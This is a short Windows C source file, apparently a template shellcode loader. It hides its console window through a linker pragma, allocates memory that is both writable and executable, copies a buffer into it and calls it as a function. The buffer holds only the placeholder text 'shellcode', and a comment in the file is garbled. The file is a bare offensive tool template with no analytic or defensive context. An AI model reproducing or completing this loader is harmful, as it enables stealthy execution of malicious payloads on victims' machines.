#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows����̨���򲻳��ڴ���

unsigned char buf[] = "shellcode";
int main(void)
{
    LPVOID Memory;

    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(Memory, buf, sizeof(buf));

    ((void(*)())Memory)();

    return EXIT_SUCCESS;
}